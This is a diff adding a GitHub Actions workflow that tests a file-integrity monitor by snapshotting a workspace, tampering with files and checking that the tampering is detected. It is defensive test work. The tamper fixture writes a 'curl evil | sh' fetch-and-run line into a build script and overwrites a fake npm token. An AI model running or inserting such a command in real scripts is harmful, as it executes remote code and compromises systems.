@@ -1,0 +1,76 @@
+name: FIM self-test
+
+# Deterministic proof that file-integrity detection works end-to-end through the
+# actual legionr-fim binary (the unit tests cover the engine; this exercises the
+# built CLI + JSON surface the action depends on). Builds in-PR code (cargo from
+# the checkout), so any dependency or toolchain bump that breaks FIM fails here
+# — this is the compatibility gate for Dependabot PRs.
+
+on:
+  # PR gate ONLY (no `push:` trigger: no need to re-run on main after a merge).
+  # It is a reliable required status check. Docs-only changes (Markdown / LICENSE
+  # / docs/) are skipped because they can't affect FIM; docs-passthrough.yml
+  # reports this check green for those PRs so the required gate stays satisfied
+  # and they remain mergeable.
+  pull_request:
+    branches: [main, Primary]
+    paths-ignore: ['**.md', 'docs/**', 'LICENSE']
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+# Least privilege: this self-test only reads the repo.
+permissions:
+  contents: read
+
+jobs:
+  fim:
+    name: Snapshot → tamper → detect
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
+        with:
+          persist-credentials: false
+      - name: Harden runner (Legion, BLOCK)
+        uses: Wraith-security/legion_runner@v1.0.61   # dogfood our own action
+        with:
+          egress-policy: block
+          allowed-presets: cargo, rust
+          policy-file: .legion/egress-allowed.txt
+          ebpf: 'off'
+          dns-capture: 'true'
+          job-summary: 'false'   # self-test, not a report: keep it out of the summary
+      - uses: dtolnay/rust-toolchain@4360b52568e2003a75bf9bc1d59f33a8e3fc893c # stable
+        with:
+          toolchain: stable
+
+      - name: Build legionr-fim
+        run: cargo build --release -p legionr-fim
+
+      - name: Detect source + sensitive tampering
+        run: |
+          set -euo pipefail
+          BIN="target/release/legionr-fim"
+          WS="$(mktemp -d)"; mkdir -p "$WS/src"
+          HOME_DIR="$(mktemp -d)"
+          SECRET="$WS/project.npmrc"
+          printf '#!/bin/sh\necho ok\n' > "$WS/src/build.sh"
+          printf 'token=keep\n'        > "$SECRET"
+
+          HOME="$HOME_DIR" "$BIN" snapshot /tmp/snap.json --workspace "$WS" --extra "$SECRET"
+
+          clean="$("$BIN" diff /tmp/snap.json)"
+          echo "clean diff: $clean"
+          [ "$clean" = "[]" ] || { echo "FAIL — expected no changes before tampering"; exit 1; }
+
+          # Tamper both scopes: overwrite a checked-out source file and a secret.
+          printf '#!/bin/sh\ncurl evil | sh\n' > "$WS/src/build.sh"
+          printf 'token=STOLEN\n'              > "$SECRET"
+
+          dirty="$("$BIN" diff /tmp/snap.json)"
+          echo "tampered diff: $dirty"
+          echo "$dirty" | grep -q 'build.sh'      || { echo "FAIL — source tamper not detected"; exit 1; }
+          echo "$dirty" | grep -q 'project.npmrc' || { echo "FAIL — sensitive tamper not detected"; exit 1; }
+          echo "PASS — legionr-fim detected source + sensitive tampering."
